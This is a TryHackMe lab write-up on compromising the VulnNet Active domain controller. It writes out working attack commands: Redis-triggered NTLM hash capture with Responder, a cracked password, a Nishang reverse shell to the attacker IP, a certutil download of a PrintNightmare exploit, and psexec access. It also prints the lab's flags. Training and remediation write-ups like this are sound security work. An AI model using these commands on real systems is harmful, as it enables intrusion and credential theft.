# Write-up: VulnNet Active lab on THM

This document is a structured security write-up based on hands-on exploitation of the **VulnNet Active** lab on TryHackMe website: https://tryhackme.com/room/vulnnetactive

**Date:** January 11, 2026  
**Source:** TryHackMe — VulnNet Active & Personal Study Notes

---

## Research Overview

This lab features an attack vector starting from a **misconfigured NoSQL** database (Redis) leading to credential theft, followed by scheduled **task abuse** for lateral movement, and finally, a critical privilege escalation using the **PrintNightmare** vulnerability.

**The compromise highlights:**  
* Improperly secured third-party software on a Domain Controller.
* Weak file system permissions on automated scripts.
* Lack of critical security patching against well-known exploits.

---

## Environment Identification & Reconnaissance

### 1. Network Scanning (Nmap)

The engagement begins with a comprehensive port scan to identify all available services:

```Bash
$ sudo nmap -sC -sV -v -Pn -p- 10.81.130.174
```

Key Open Ports:
* **53/tcp** — DNS (Simple DNS Plus)
* **135, 139, 445/tcp** — RPC & SMB
* **464/tcp** — kpasswd5 (Kerberos password change)
* **6379/tcp** — Redis key-value store 2.8.2402
* **9389/tcp** — .NET Message Framing

---

### 2. Domain Controller Fingerprinting

The host is identified as a **Domain Controller** based on the following:
* **Port 53 (DNS):** In AD environments, DNS is almost always integrated with the DC.
* **Ports 139/445 & 464:** The presence of Kerberos password change services is a 99% indicator of a DC role.

*Initial Enumeration*

---

### 3. Domain & User Discovery

Initial enumeration using **enum4linux** and **kerbrute** confirms the domain name and identifies a valid administrative account:  

```Bash
$ enum4linux -a 10.81.130.174
$ ./kerbrute_linux_amd64 userenum -d VULNNET.local --dc 10.81.130.174 users3.txt
```

Results:
* **Domain:** VULNNET.local
* **User:** administrator@VULNNET.local

*Initial Access — Redis Exploitation*

---

### 4. Redis Misconfiguration

Port **6379 (Redis)** is an unusual find on a DC. Version 2.8.x is legacy and often lacks authentication.

```Bash
$ redis-cli -h 10.81.130.174 # Attempting unauthenticated access  
```

Access is granted without a password. To escalate this, we use Responder to capture the **NTLMv2 hash** of the service account by forcing Redis to access a fake remote directory.

```Bash
$ sudo responder -I tun0 -dwv # Start Responder on the attacker machine
> CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
```

---

### 5. Hash Cracking

Responder captures the hash for user **enterprise-security**.

```
[SMB] NTLMv2-SSP Hash : enterprise-security::VULNNET:...
```

Using hashcat with the **rockyou.txt** wordlist:  
* **Credentials Found:** enterprise-security:sand_0873959498

*Lateral Movement — Task Abuse*

---

### 6. SMB Share Enumeration

Using the recovered credentials, we re-scan the SMB shares:  

```Bash
$ enum4linux -u enterprise-security -p sand_0873959498 -a 10.81.130.174
```

An interesting share named **Enterprise-Share** is found. Inside, there is a PowerShell script:  
* PurgeIrrelevantData_1826.ps1

```PowerShell
# Content of the script:
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

---

### 7. Reverse Shell Injection

Since our user has write access to this share, we can replace the script with a **Nishang** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell:  

```Bash
# Append payload to the Nishang script:
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
```

```Bash
$ smbclient //10.81.130.174/Enterprise-Share -U VULNNET.local/enterprise-security%sand_0873959498
> put PurgeIrrelevantData_1826.ps1
```

After a few seconds, a shell is received:  
* **User Flag:** THM{3eb176aee96432d5b100bc93580b291e}

*Privilege Escalation — PrintNightmare*

---

### 8. Vulnerability Assessment

Checking the **Spooler** service and missing patches for CVE-2021-34527:  

```PowerShell
> Get-Service Spooler # Status: Running
> Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" } # Result: Empty
```

---

### 9. Exploitation

We upload a **PrintNightmare** exploit (https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1) to the target:  

```PowerShell
> certutil -urlcache -split -f http://192.168.144.226/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1
> Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
> Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"
```  

The exploit creates a **new local administrator**. We then use impacket-psexec to gain **SYSTEM** access:  

```Bash
$ impacket-psexec VULNNET.local/overmane:Passwd123@10.81.130.174
```

**System Flag:** THM{d540c0645975900e5bb9167aa431fc9b}

---

## Security Failures & Root Causes

1. **Vulnerable Redis Instance:** Third-party software was left unauthenticated and exposed on the network.
2. **Insecure Script Permissions:** A service account had write access to a script executed by a higher-privileged process.
3. **Missing Security Patches:** The system was vulnerable to PrintNightmare, allowing instant local-to-system escalation.

---

## Remediation Recommendations
* **Secure Redis:** Implement requirepass, bind it to localhost only, or decommission it if not required on the DC.
* **Apply Principle of Least Privilege (PoLP):** Restrict write access to any scripts or directories used by automated tasks/cron jobs.
* **Patch Management:** Immediately install updates for PrintNightmare (KB5004945/KB5005033) or disable the Print Spooler service if printing is not required.
* **Credential Hardening:** Enforce complex passwords to prevent offline cracking of intercepted NTLM hashes.

---

## Conclusion

The compromise of **VULNNET.local** illustrates how a single misconfigured third-party service (Redis) can provide the foothold necessary to **completely take over an Active Directory domain**. Regular patching and strict file permission audits are critical to preventing such attacks.

---

*Write-up compiled based on TryHackMe VulnNet Active (https://tryhackme.com/room/vulnnetactive) lab.*


